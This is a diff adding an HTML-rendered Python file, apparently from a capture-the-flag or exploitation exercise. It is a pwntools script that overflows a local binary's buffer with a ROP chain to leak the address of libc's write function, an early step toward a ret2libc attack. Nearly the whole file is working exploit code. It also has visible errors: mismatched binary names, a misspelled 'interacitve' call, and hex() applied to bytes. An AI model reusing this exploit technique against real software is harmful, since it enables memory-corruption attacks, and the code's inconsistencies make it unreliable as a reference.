@@ -1,0 +1,34 @@
+<html><head>
+<title>get_addr.py</title>
+<meta name="Generator" content="htmlizer/[Twisted, version 17.9.0]" />
+<link rel="alternate" href="get_addr.py" type="text/x-python" />
+
+</head>
+<body>
+<pre><span class="py-src-keyword">from</span> <span class="py-src-variable">pwn</span> <span class="py-src-keyword">import</span> *
+
+<span class="py-src-variable">vb</span> = <span class="py-src-variable">ELF</span>(<span class="py-src-string">'vf'</span>)
+<span class="py-src-variable">libc</span> = <span class="py-src-variable">ELF</span>(<span class="py-src-string">'libc.so.6'</span>)
+
+<span class="py-src-variable">write_plt</span> = <span class="py-src-variable">vb</span>.<span class="py-src-variable">plt</span>[<span class="py-src-string">'write'</span>]
+<span class="py-src-variable">write_got</span> = <span class="py-src-variable">vb</span>.<span class="py-src-variable">got</span>[<span class="py-src-string">'write'</span>]
+<span class="py-src-keyword">print</span> <span class="py-src-string">'write_plt = '</span> + <span class="py-src-variable">hex</span>(<span class="py-src-variable">write_plt</span>)
+<span class="py-src-keyword">print</span> <span class="py-src-string">'write_got = '</span> + <span class="py-src-variable">hex</span>(<span class="py-src-variable">write_got</span>)
+<span class="py-src-keyword">print</span> <span class="py-src-string">'write_sym = '</span> + <span class="py-src-variable">hex</span>(<span class="py-src-variable">vb</span>.<span class="py-src-variable">symbols</span>[<span class="py-src-string">'write'</span>])
+<span class="py-src-variable">addr_bin</span> = <span class="py-src-number">0xb7f4bdc8</span>
+<span class="py-src-variable">vul_func</span> = <span class="py-src-number">0x0804854e</span>
+
+<span class="py-src-variable">write_plt</span> = <span class="py-src-number">0xb7ec5cd0</span>
+<span class="py-src-variable">shellcode</span> = <span class="py-src-number">512</span> * <span class="py-src-string">'A'</span>
+<span class="py-src-variable">shellcode</span> += <span class="py-src-variable">p32</span>(<span class="py-src-variable">write_plt</span>) + <span class="py-src-variable">p32</span>(<span class="py-src-variable">vul_func</span>) + <span class="py-src-variable">p32</span>(<span class="py-src-number">1</span>) + <span class="py-src-variable">p32</span>(<span class="py-src-variable">write_got</span>) + <span class="py-src-variable">p32</span>(<span class="py-src-number">4</span>)
+
+<span class="py-src-variable">f</span> = <span class="py-src-variable">open</span>(<span class="py-src-string">'test.txt'</span>, <span class="py-src-string">'w'</span>)
+<span class="py-src-variable">f</span>.<span class="py-src-variable">write</span>(<span class="py-src-variable">shellcode</span>)
+<span class="py-src-variable">f</span>.<span class="py-src-variable">close</span>()
+
+<span class="py-src-variable">p</span> = <span class="py-src-variable">process</span>([<span class="py-src-string">'./vr'</span>, ])
+<span class="py-src-variable">p</span>.<span class="py-src-variable">send</span>(<span class="py-src-variable">shellcode</span>)
+<span class="py-src-keyword">print</span> <span class="py-src-variable">hex</span>(<span class="py-src-variable">p</span>.<span class="py-src-variable">recvall</span>())
+<span class="py-src-variable">p</span>.<span class="py-src-variable">interacitve</span>()
+</pre>
+</body>
